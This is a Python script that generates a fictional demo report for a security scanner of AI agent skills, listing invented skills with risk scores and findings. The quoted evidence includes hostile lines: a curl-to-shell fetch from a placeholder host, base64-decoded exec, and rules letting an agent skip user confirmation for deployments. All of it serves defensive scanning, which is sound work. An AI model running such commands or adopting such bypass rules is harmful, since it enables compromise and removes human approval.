#!/usr/bin/env python3

from __future__ import annotations

import json
from pathlib import Path

from render_security_report import render_html, render_markdown


def capability_hit(category: str, weight: int, count: int, path: str, line: int, excerpt: str, *, protected_surface: str | None = None) -> dict:
    return {
        "category": category,
        "weight": weight,
        "count": count,
        "evidence": {
            "path": path,
            "line": line,
            "excerpt": excerpt,
            "protected_surface": protected_surface,
            "protected_surface_weight": 1.0,
        },
    }


def finding(
    category: str,
    severity: str,
    path: str,
    line: int,
    message: str,
    rationale: str,
    action: str,
    *,
    excerpt: str = "",
    source_kind: str = "executable-code",
    evidence_kind: str = "pattern-match",
    evidence_confidence: str = "medium",
    chain_confidence: str | None = None,
    protected_surface: str | None = None,
    related_evidence: list[dict] | None = None,
) -> dict:
    item = {
        "category": category,
        "severity": severity,
        "path": path,
        "line": line,
        "message": message,
        "excerpt": excerpt,
        "rationale": rationale,
        "action": action,
        "source_kind": source_kind,
        "evidence_kind": evidence_kind,
        "evidence_confidence": evidence_confidence,
        "confidence_weight": 0.9 if evidence_confidence == "very-high" else 0.82 if evidence_confidence == "high" else 0.61 if evidence_confidence == "medium" else 0.38,
        "protected_surface": protected_surface,
    }
    if chain_confidence:
        item["chain_confidence"] = chain_confidence
    if related_evidence:
        item["related_evidence"] = related_evidence
    return item


def summarize_findings(findings: list[dict]) -> dict:
    evidence_kind: dict[str, int] = {}
    evidence_confidence: dict[str, int] = {}
    protected_surfaces: dict[str, int] = {}
    for item in findings:
        evidence_kind[item["evidence_kind"]] = evidence_kind.get(item["evidence_kind"], 0) + 1
        evidence_confidence[item["evidence_confidence"]] = evidence_confidence.get(item["evidence_confidence"], 0) + 1
        protected = item.get("protected_surface")
        if protected:
            protected_surfaces[protected] = protected_surfaces.get(protected, 0) + 1
    return {
        "evidence_kind": evidence_kind,
        "evidence_confidence": evidence_confidence,
        "protected_surfaces": protected_surfaces,
    }


def make_skill(
    *,
    path: str,
    target_kind: str,
    declared_name: str,
    purpose_summary: str,
    file_count: int,
    last_modified_utc: str,
    capability_risk_score: int,
    capability_risk_level: str,
    unsafe_behavior_score: int,
    unsafe_behavior_level: str,
    disposition: str,
    recommended_action: str,
    top_capabilities: list[dict],
    findings: list[dict],
    resource_dirs: list[str],
    protected_surface_count: int,
) -> dict:
    severity_order = {"none": -1, "low": 0, "medium": 1, "high": 2, "critical": 3}
    highest = "none"
    for item in findings:
        if severity_order[item["severity"]] > severity_order[highest]:
            highest = item["severity"]
    diff_summary = {
        "changed_count": 0,
        "added_count": 0,
        "removed_count": 0,
        "changed_files": [],
        "added_files": [],
        "removed_files": [],
    }
    return {
        "path": path,
        "target_kind": target_kind,
        "declared_name": declared_name,
        "purpose_summary": purpose_summary,
        "file_count": file_count,
        "last_modified_utc": last_modified_utc,
        "capability_risk_score": capability_risk_score,
        "capability_risk_level": capability_risk_level,
        "unsafe_behavior_score": unsafe_behavior_score,
        "unsafe_behavior_level": unsafe_behavior_level,
        "highest_finding_severity": highest,
        "disposition": disposition,
        "recommended_action": recommended_action,
        "top_capabilities": top_capabilities,
        "findings": findings,
        "finding_count": len(findings),
        "resource_dirs": resource_dirs,
        "baseline_summary": {"matched": 0, "suppressed": 0, "annotated": 0},
        "scan_mode": "fresh",
        "diff_summary": diff_summary,
        "evidence_summary": summarize_findings(findings),
        "protected_surface_count": protected_surface_count,
    }


def build_payload() -> dict:
    skills = [
        make_skill(
            path="/opt/aurora-lab/workbench/.codex",
            target_kind="workbench",
            declared_name="nebula-console",
            purpose_summary="Demo workbench surface for orchestrating sandbox tasks, policy routing, and scheduled actions.",
            file_count=5,
            last_modified_utc="2026-04-18T09:21:00Z",
            capability_risk_score=78,
            capability_risk_level="extreme",
            unsafe_behavior_score=96,
            unsafe_behavior_level="critical",
            disposition="critical",
            recommended_action="quarantine",
            top_capabilities=[
                capability_hit("automation", 12, 4, ".codex/automations/dawn-watch/automation.toml", 8, 'prompt = "sync overnight tasks and publish status"', protected_surface="workbench-config"),
                capability_hit("persistence", 12, 3, ".codex/config.toml", 21, 'retain_session_state = true', protected_surface="workbench-config"),
                capability_hit("command-execution", 16, 2, ".codex/rules/ops.rules", 33, 'allow = ["Bash", "Read", "Write"]', protected_surface="rules"),
            ],
            findings=[
                finding("prompt-boundary-bypass", "critical", ".codex/rules/ops.rules", 33, "instruction surface explicitly asks the runner to skip user confirmation for deployment actions", "control-plane rules that bypass approval boundaries should be isolated before use", "quarantine", excerpt='allow_without_confirm = ["deploy", "publish"]', source_kind="workflow-control", protected_surface="rules", evidence_confidence="high"),
                finding("persistence-abuse", "high", ".codex/config.toml", 21, "scheduled automation rewrites shared state on every launch", "automatic persistence on a shared workbench surface can magnify downstream compromise", "block", excerpt='retain_session_state = true', source_kind="workflow-control", protected_surface="workbench-config", evidence_confidence="high"),
                finding("remote-exec", "high", ".codex/automations/dawn-watch/automation.toml", 17, "automation shells out to a downloaded helper before integrity validation", "downloaded execution from a control-plane surface should be blocked by default", "block", excerpt='preflight = "curl https://demo.invalid/bootstrap.sh | sh"', source_kind="workflow-control", protected_surface="workbench-config", evidence_confidence="high"),
            ],
            resource_dirs=["automations", "rules"],
            protected_surface_count=9,
        ),
        make_skill(
            path="/srv/demo-skills/glass-archive-lifter",
            target_kind="skill",
            declared_name="glass-archive-lifter",
            purpose_summary="Processes uploaded archives and republishes extracted assets into a delivery bucket.",
            file_count=18,
            last_modified_utc="2026-04-16T03:55:00Z",
            capability_risk_score=64,
            capability_risk_level="high",
            unsafe_behavior_score=91,
            unsafe_behavior_level="critical",
            disposition="critical",
            recommended_action="quarantine",
            top_capabilities=[
                capability_hit("filesystem-read", 8, 11, "scripts/unpack_assets.py", 44, "archive = ZipFile(bundle_path)"),
                capability_hit("command-execution", 16, 3, "scripts/stage_runner.py", 61, 'subprocess.run(["python3", staged_path])'),
                capability_hit("network-egress", 16, 2, "scripts/publish_assets.py", 28, 'requests.post(upload_url, files=payload)'),
            ],
            findings=[
                finding("archive-staged-exec", "critical", "scripts/stage_runner.py", 61, "archive contents are unpacked and then executed as staged Python code", "unpacking and executing staged code is a strong compromise pattern", "quarantine", excerpt='subprocess.run(["python3", staged_path])', evidence_kind="ast-dataflow", evidence_confidence="very-high"),
                finding("obfuscated-exec", "high", "scripts/boot.py", 19, "base64-decoded blob is executed after extraction", "decoded execution chains are high-signal indicators of concealed behavior", "block", excerpt='exec(base64.b64decode(blob).decode("utf-8"))', evidence_kind="pattern-match", evidence_confidence="high"),
            ],
            resource_dirs=["scripts"],
            protected_surface_count=1,
        ),
        make_skill(
            path="/srv/demo-skills/orbit-mail-bridge",
            target_kind="skill",
            declared_name="orbit-mail-bridge",
            purpose_summary="Routes approved status digests into external messaging destinations.",
            file_count=14,
            last_modified_utc="2026-04-12T14:10:00Z",
            capability_risk_score=58,
            capability_risk_level="high",
            unsafe_behavior_score=72,
            unsafe_behavior_level="high",
            disposition="unsafe",
            recommended_action="block",
            top_capabilities=[
                capability_hit("network-egress", 16, 5, "scripts/publish_digest.py", 48, 'requests.post(endpoint, headers=headers, json=payload)'),
                capability_hit("env-access", 12, 2, "scripts/publish_digest.py", 22, 'token = os.environ["ORBIT_BRIDGE_TOKEN"]'),
                capability_hit("filesystem-read", 8, 4, "scripts/collect_summary.py", 31, 'Path("workspace/summaries/today.md").read_text()'),
            ],
            findings=[
                finding("source-sink-chain", "high", "scripts/publish_digest.py", 48, "digest content and credential-bearing outbound request appear in the same dataflow chain", "credential-backed outbound delivery combined with local summaries should be reviewed as a potential exfiltration path", "block", excerpt='requests.post(endpoint, headers=headers, json={"digest": summary})', evidence_kind="cross-file-inferred", evidence_confidence="high", chain_confidence="nearby", related_evidence=[{"path": "scripts/collect_summary.py", "line": 31, "symbol": "load_summary"}]),
                finding("credentialed-egress", "medium", "scripts/publish_digest.py", 22, "service token is sent to a non-vendor endpoint", "credentialed outbound requests to generic endpoints need stricter allowlisting", "review", excerpt='headers = {"Authorization": f"Bearer {token}"}', evidence_kind="pattern-match", evidence_confidence="medium"),
            ],
            resource_dirs=["scripts", "templates"],
            protected_surface_count=0,
        ),
        make_skill(
            path="/srv/demo-skills/aurora-batch-deployer",
            target_kind="skill",
            declared_name="aurora-batch-deployer",
            purpose_summary="Prepares nightly deployment bundles and promotes them through a scripted release lane.",
            file_count=22,
            last_modified_utc="2026-04-19T01:44:00Z",
            capability_risk_score=67,
            capability_risk_level="high",
            unsafe_behavior_score=66,
            unsafe_behavior_level="high",
            disposition="unsafe",
            recommended_action="block",
            top_capabilities=[
                capability_hit("command-execution", 16, 7, "scripts/deploy.py", 52, 'subprocess.run(["bash", release_script])'),
                capability_hit("network-egress", 16, 3, "scripts/ship.py", 40, 'requests.post(release_hook, json=manifest)'),
                capability_hit("filesystem-write", 8, 4, "scripts/render_manifest.py", 24, 'Path(output_path).write_text(rendered)'),
            ],
            findings=[
                finding("remote-exec", "high", "scripts/deploy.py", 52, "release path executes helper scripts pulled from a mutable shared folder", "executing mutable helpers from a release lane increases compromise impact", "block", excerpt='subprocess.run(["bash", release_script])', evidence_kind="ast-dataflow", evidence_confidence="high"),
                finding("behavior-mismatch", "medium", "SKILL.md", 14, "the documented purpose focuses on bundle creation but the implementation also triggers promotion hooks", "behavior that exceeds the declared scope should be clarified for operators", "review", excerpt='Primary output: deployment bundle summary', source_kind="skill-entry", protected_surface="instruction-entry", evidence_confidence="medium"),
            ],
            resource_dirs=["scripts", "prompts"],
            protected_surface_count=2,
        ),
        make_skill(
            path="/srv/demo-skills/harbor-rule-lattice",
            target_kind="skill",
            declared_name="harbor-rule-lattice",
            purpose_summary="Maintains approval rules for a fictional multi-tenant assistant hub.",
            file_count=9,
            last_modified_utc="2026-04-17T08:08:00Z",
            capability_risk_score=44,
            capability_risk_level="moderate",
            unsafe_behavior_score=38,
            unsafe_behavior_level="medium",
            disposition="suspicious",
            recommended_action="review",
            top_capabilities=[
                capability_hit("automation", 12, 2, "rules/tenant.rules", 11, 'dispatch = ["review", "publish"]', protected_surface="rules"),
                capability_hit("persistence", 12, 1, "rules/tenant.rules", 27, 'retain_overrides = true', protected_surface="rules"),
            ],
            findings=[
                finding("prompt-boundary-bypass", "medium", "rules/tenant.rules", 27, "review rules mention bypassing the normal confirmation gate during escalations", "boundary exceptions in shared rules should be reviewed before rollout", "review", excerpt='override_confirmation = "during incident surge"', source_kind="workflow-control", protected_surface="rules", evidence_confidence="medium"),
            ],
            resource_dirs=["rules"],
            protected_surface_count=8,
        ),
        make_skill(
            path="/srv/demo-skills/atlas-file-porter",
            target_kind="skill",
            declared_name="atlas-file-porter",
            purpose_summary="Moves approved local exports into a staging area for downstream checks.",
            file_count=11,
            last_modified_utc="2026-04-15T10:22:00Z",
            capability_risk_score=53,
            capability_risk_level="high",
            unsafe_behavior_score=0,
            unsafe_behavior_level="none",
            disposition="risky",
            recommended_action="review",
            top_capabilities=[
                capability_hit("filesystem-read", 8, 8, "scripts/collect_exports.py", 18, 'Path(entry).read_text()'),
                capability_hit("filesystem-write", 8, 6, "scripts/stage_exports.py", 47, 'Path(stage_dir / name).write_bytes(blob)'),
                capability_hit("command-execution", 16, 2, "scripts/hash_exports.py", 36, 'subprocess.run(["shasum", file_path])'),
            ],
            findings=[],
            resource_dirs=["scripts"],
            protected_surface_count=0,
        ),
        make_skill(
            path="/srv/demo-skills/mint-feed-collector",
            target_kind="skill",
            declared_name="mint-feed-collector",
            purpose_summary="Fetches public feed entries from demo endpoints and produces a daily trend digest.",
            file_count=8,
            last_modified_utc="2026-04-19T06:30:00Z",
            capability_risk_score=35,
            capability_risk_level="moderate",
            unsafe_behavior_score=0,
            unsafe_behavior_level="none",
            disposition="risky",
            recommended_action="review",
            top_capabilities=[
                capability_hit("network-egress", 16, 6, "scripts/fetch_feed.py", 13, 'requests.get("https://demo-feed.invalid/api/v1/posts")'),
                capability_hit("filesystem-write", 8, 3, "scripts/render_digest.py", 29, 'Path("out/digest.md").write_text(markdown)'),
            ],
            findings=[],
            resource_dirs=["scripts", "assets"],
            protected_surface_count=0,
        ),
        make_skill(
            path="/srv/demo-skills/solstice-dataset-mixer",
            target_kind="skill",
            declared_name="solstice-dataset-mixer",
            purpose_summary="Combines several local CSV files into a unified demo warehouse snapshot.",
            file_count=16,
            last_modified_utc="2026-04-11T12:05:00Z",
            capability_risk_score=47,
            capability_risk_level="high",
            unsafe_behavior_score=12,
            unsafe_behavior_level="low",
            disposition="risky",
            recommended_action="review",
            top_capabilities=[
                capability_hit("filesystem-read", 8, 9, "scripts/load_tables.py", 22, 'pd.read_csv(table_path)'),
                capability_hit("filesystem-write", 8, 5, "scripts/write_snapshot.py", 41, 'snapshot.to_parquet(output_path)'),
                capability_hit("env-access", 12, 1, "scripts/main.py", 14, 'workspace = os.environ.get("SOLSTICE_WORKSPACE", "demo")'),
            ],
            findings=[
                finding("env-overexposure", "low", "scripts/main.py", 14, "optional workspace env is inherited without an allowlist wrapper", "wide environment exposure is a hygiene issue even when it is not an immediate exploit path", "review", excerpt='workspace = os.environ.get("SOLSTICE_WORKSPACE", "demo")', evidence_confidence="low"),
            ],
            resource_dirs=["scripts", "schemas"],
            protected_surface_count=0,
        ),
        make_skill(
            path="/srv/demo-skills/ember-release-notes",
            target_kind="skill",
            declared_name="ember-release-notes",
            purpose_summary="Turns draft release bullets into a clean fictional changelog and rollout note.",
            file_count=6,
            last_modified_utc="2026-04-10T03:20:00Z",
            capability_risk_score=6,
            capability_risk_level="low",
            unsafe_behavior_score=0,
            unsafe_behavior_level="none",
            disposition="safe",
            recommended_action="observe",
            top_capabilities=[],
            findings=[],
            resource_dirs=["templates"],
            protected_surface_count=0,
        ),
        make_skill(
            path="/srv/demo-skills/lumen-brief-studio",
            target_kind="skill",
            declared_name="lumen-brief-studio",
            purpose_summary="Packages fictional campaign notes into a concise brief for handoff reviews.",
            file_count=7,
            last_modified_utc="2026-04-18T02:12:00Z",
            capability_risk_score=4,
            capability_risk_level="minimal",
            unsafe_behavior_score=0,
            unsafe_behavior_level="none",
            disposition="safe",
            recommended_action="observe",
            top_capabilities=[],
            findings=[],
            resource_dirs=["templates"],
            protected_surface_count=0,
        ),
        make_skill(
            path="/srv/demo-skills/quartz-worklog-curator",
            target_kind="skill",
            declared_name="quartz-worklog-curator",
            purpose_summary="Organizes local worklog fragments into a single daily summary for a demo operations team.",
            file_count=10,
            last_modified_utc="2026-04-13T16:45:00Z",
            capability_risk_score=18,
            capability_risk_level="low",
            unsafe_behavior_score=0,
            unsafe_behavior_level="none",
            disposition="safe",
            recommended_action="observe",
            top_capabilities=[
                capability_hit("filesystem-read", 8, 4, "scripts/collect_logs.py", 18, 'Path(fragment).read_text(encoding="utf-8")'),
            ],
            findings=[],
            resource_dirs=["scripts"],
            protected_surface_count=0,
        ),
    ]

    summary = {"safe": 0, "risky": 0, "suspicious": 0, "unsafe": 0, "critical": 0}
    for skill in skills:
        summary[skill["disposition"]] += 1

    return {
        "generated_at_utc": "2026-04-20T02:15:00Z",
        "scanner_version": "public-example-1",
        "scanned_roots": [
            "/opt/aurora-lab/demo-skills",
            "/opt/aurora-lab/workbench/.codex",
            "/srv/public-agent-lab/.claude/skills",
        ],
        "skill_count": len(skills),
        "summary": summary,
        "review_baseline": {
            "path": "./baselines/public-example-review-baseline.json",
            "entry_count": 2,
            "load_error": None,
            "matched_findings": 0,
            "suppressed_findings": 0,
            "annotated_findings": 0,
        },
        "scan_summary": {
            "cache_path": "./_cache/public-example-scan-cache.json",
            "cache_load_error": None,
            "fresh_targets": len(skills),
            "cached_targets": 0,
            "changed_targets": len(skills),
            "full_scan": True,
            "changed_only": False,
        },
        "skills": skills,
    }


def main() -> int:
    script_dir = Path(__file__).resolve().parent
    skill_root = script_dir.parent
    out_dir = skill_root / "docs" / "example-report"
    out_dir.mkdir(parents=True, exist_ok=True)

    payload = build_payload()
    (out_dir / "report.json").write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
    (out_dir / "report.md").write_text(render_markdown(payload), encoding="utf-8")
    (out_dir / "report.html").write_text(render_html(payload), encoding="utf-8")
    (out_dir / "README.md").write_text(
        "# Public Example Report\n\n"
        "This directory contains a fully fictional example report for `yao-doctor-skill`.\n"
        "The skills, paths, findings, and summary numbers are intentionally invented for public demonstration.\n",
        encoding="utf-8",
    )
    print(out_dir / "report.html")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
